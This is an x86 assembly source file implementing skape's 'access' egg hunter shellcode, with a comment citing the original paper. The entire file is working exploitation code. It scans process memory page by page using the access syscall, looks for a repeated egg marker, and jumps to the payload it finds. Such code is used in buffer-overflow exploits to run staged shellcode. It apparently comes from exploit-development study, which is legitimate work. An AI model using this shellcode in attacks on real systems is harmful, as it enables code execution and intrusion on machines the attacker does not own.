/* accept egg hunter from "Safely Searching Process Virtual Address Space,
 * skape", published at http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
 * (last access, August 2018). */

.global main
.text

main: 
	mul %eax
a_page: 
        orw $0xfff,%dx          
a_byte: 
        incl %edx               
        leal 4(%edx),%ebx       

	/* int access(const char *pathname, int mode); - 33 */
        pushl $33              
        popl %eax
        int $0x80              

        cmpb $0xf2, %al
        jz a_page

        movl $0x50905090,%eax   
        movl %edx,%edi

        scasl
        jnz a_byte

        scasl
        jnz a_byte

        jmp *%edi

